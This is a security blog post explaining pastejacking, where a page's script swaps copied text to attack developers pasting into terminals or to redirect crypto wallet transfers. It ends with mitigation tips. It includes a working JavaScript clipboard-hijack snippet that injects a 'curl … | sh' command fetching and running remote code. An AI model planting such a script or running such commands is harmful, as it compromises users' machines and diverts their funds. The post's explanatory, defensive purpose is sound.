---
layout: post
title: 'Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data'
categories: [blog]
tags: crypto cybersecurity
---

The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as [pastejacking](https://www.geeksforgeeks.org/what-is-pastejacking/), can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.

Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack. 

Server-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. 
Using methods such as [cross-site scripting (XSS) attacks](https://owasp.org/www-community/attacks/DOM_Based_XSS), an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.

## How Javascript Pastejacking Works

For demonstration purposes, let’s take a look at the following Javascript code snippet:
```
<script>
document.getElementById('copied-text').addEventListener('copy', 
function(e) {
    e.clipboardData.setData('text/plain', 
        'curl https://forkbomb.io/shadowrealm | sh\n'
    );
    e.preventDefault();
});
</script>
```

Attackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.

## Using Pastejacking to Attack Developers

Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal. 

The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:  
```
curl https://forkbomb.io/shadowrealm | sh\n
``` 
This string is a curl command that navigates a user to the URL [https://forkbomb.io/shadowrealm](https://forkbomb.io/shadowrealm/), which in this case is a striking yet graceful warning to users. 

Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway. 

This form of attack can be hazardous as this can be a form of [targeting developers](https://cycode.com/blog/why-developers-are-hackers-new-targets-and-what-to-do-about-it/) who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances. 

## Using Pastejacking to Attack Crypto Wallets

More nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above. 

Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:

![pastejacking-crypto-wallets-forkbomb-address-theft-defi](_site/assets/image/posts/pastejacking-crypto-wallets-forkbomb-address-theft-defi.png){:class="img-responsive"}

You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.

In the case of Metamask, tools such as [LavaMoat](https://github.com/LavaMoat/LavaMoat) are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users. 

## Preventing Crypto Theft 
As users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:
- Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction. 
- At least double/triple check the first 4 characters of the contract to see that they match up.
- Investigate suspicious contracts, especially if there is high outflow to another contract address.
- If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address

Unfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.

## Key Learnings for Defi Developers

Just like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.

